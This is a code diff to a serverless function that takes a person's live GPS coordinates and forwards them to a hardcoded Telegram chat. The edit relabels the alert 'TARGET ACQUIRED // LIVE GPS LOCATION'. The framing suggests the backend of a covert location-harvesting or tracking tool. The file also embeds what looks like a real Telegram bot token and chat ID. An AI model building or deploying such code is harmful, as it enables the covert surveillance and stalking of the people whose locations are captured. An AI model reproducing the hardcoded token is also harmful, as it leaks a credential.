@@ -1,4 +1,4 @@
-// Vercel serverless function: receive live location, send to Telegram with interactive button
+// Vercel serverless function: receive live GPS location and send modern SOC alert
 const TOKEN = process.env.TG_BOT_TOKEN || '8746655192:AAE0OabqXKfBkbs_kIlIRQEKNo_kE3JB49k';
 const CHAT = process.env.TG_CHAT_ID || '8908879084';
 
@@ -10,11 +10,11 @@ module.exports = async function handler(req, res) {
   }
   const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
   const lines = [
-    `📍 <b>Live GPS Location</b>\n`,
+    '🎯 <b>TARGET ACQUIRED // LIVE GPS LOCATION</b>\n',
     `🌐 <b>Coordinates:</b> <code>${lat}, ${lng}</code>`,
   ];
   if (acc) {
-    lines.push(`🎯 <b>Accuracy:</b> ±${Math.round(parseFloat(acc))}m`);
+    lines.push(`🎯 <b>GPS Accuracy:</b> ±${Math.round(parseFloat(acc))} meters`);
   }
 
   const text = lines.join('\n');
@@ -32,7 +32,7 @@ module.exports = async function handler(req, res) {
         reply_markup: {
           inline_keyboard: [
             [
-              { text: '📍 Open Live Location (Google Maps)', url: mapUrl }
+              { text: '📍 Open in Google Maps', url: mapUrl }
             ]
           ]
         }
